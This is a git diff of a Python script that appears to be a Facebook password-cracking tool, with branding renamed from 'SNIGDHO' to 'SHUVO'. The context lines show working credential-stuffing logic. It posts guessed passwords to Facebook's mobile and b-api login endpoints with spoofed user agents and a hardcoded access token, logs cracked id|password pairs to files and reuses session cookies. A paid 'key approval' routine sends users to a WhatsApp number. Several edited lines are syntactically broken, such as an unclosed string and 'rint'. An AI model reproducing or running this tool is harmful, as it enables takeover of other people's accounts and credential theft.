@@ -84,7 +84,7 @@ def clear():
 def back():
 	login()
 
-SNIGDHO="SNIGDHO-"
+SHUVO="SHUVO-"
 imt="-EX4786=="
 VAU="VAU-"
 myid=uuid.uuid4().hex[:10].upper()
@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ SNIGDHO ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ SHUVO ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,14 +324,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ SNIGDHO-CP 🥵] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ SHUVO-CP 🥵] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ SNIGDHO-OK 😍] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ SHUVO-OK 😍] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ SNIGDHO ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ SHUVO ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,17 +362,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ SNIGDHO-CP 🥵] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ SHUVO-CP 🥵] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ SNIGDHO-OK 😍] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ SHUVO-OK 😍] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/SNIGDHO-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/SHUVO-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -396,8 +396,8 @@ logo = ("""\033[132m
   \033[1;32m_____/ | |      |_|\____/    \/   \____/ 
   \033[1;32m══════════════════════════════════════════════════════════\33[m 
           \033[1;32mOwner  :   MR. Shuvo\33[m 																	    
-         \033[1;32mGithub  :   shuvonilasha	    			   						                    
-        \033[1;32mFb Page  :   @Mr.SNIGDHO.VAU\33[m 											               
+         \033[1;32mGithub  :   shuvoabalove/Shuvo-py1	    			   						                    
+        \033[1;32mFb Page  :   @Mr.SHUVO.VAU\33[m 											               
   \033[1;32m══════════════════════════════════════════════════════════\033[1;37m""")
 
 class Main:
@@ -871,10 +871,10 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ SNIGDHO-OK 😍] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SHUVO-OK 😍] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-SNIGDHO-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SHUVO-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ SHUVO-OK 😍] %s | %s\033[0;97m         "%(uid, pw))
@@ -1298,15 +1298,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ SNIGDHO-OK 😍] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SHUVO-OK 😍] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-SNIGDHO-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SHUVO-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ SNIGDHO-OK 😍] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SHUVO-OK 😍] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-SNIGDHO-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SHUVO-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1331,20 +1331,20 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m SNIGDHO Toll Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m SHUVO Toll Paid You Need Get Approved First\033[1;37m\n")
 		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
 		print(" Copy And Send Key To Admin")
 		print ("")
-		print (" Your Key : aba.love.you.420
+		print (" Your Key :"75739938266588")
 		print ("")
 		name = input (" Your Name : ")
 		print ("")
-		input(" Press Enter To Send Key")
+		input(" Press Enter To Send Key#8F00FF#0200FF")
 		time.sleep(3.5)
-		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+SNIGDHO+VAU+key1
+		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+SHUVO+VAU+key1
 		os.system('am start https://wa.me/+8801707326011?text=' + tks)
 		Subscraption()        
 Subscraption()     
